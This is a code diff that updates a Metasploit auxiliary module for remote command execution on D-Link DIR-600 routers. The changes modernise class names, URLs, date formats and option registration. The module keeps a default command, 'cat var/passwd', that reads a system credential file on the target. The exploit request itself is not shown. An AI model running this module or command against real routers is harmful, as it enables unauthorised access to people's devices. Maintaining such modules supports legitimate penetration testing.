@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -26,18 +23,17 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'OSVDB', '89861' ],
           [ 'EDB', '24453' ],
-          [ 'URL', 'http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router' ],
+          [ 'URL', 'https://eu.dlink.com/uk/en/products/dir-600-wireless-n-150-home-router' ],
           [ 'URL', 'http://www.s3cur1ty.de/home-network-horror-days' ],
           [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-003' ]
         ],
-      'DefaultTarget'  => 0,
-      'DisclosureDate' => 'Feb 04 2013'))
+      'DisclosureDate' => '2013-02-04'))
 
     register_options(
       [
         Opt::RPORT(80),
         OptString.new('CMD', [ true, 'The command to execute', 'cat var/passwd'])
-      ], self.class)
+      ])
   end
 
   def run
@@ -67,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
       print_line("#{rhost}:#{rport} - Command: #{datastore['CMD']}\n")
       print_line("#{rhost}:#{rport} - Output: #{res.body}")
     else
-      print_error("#{rhost}:#{rport} - Exploit failed.")
+      print_error("#{rhost}:#{rport} - Exploit failed")
     end
   end
 end
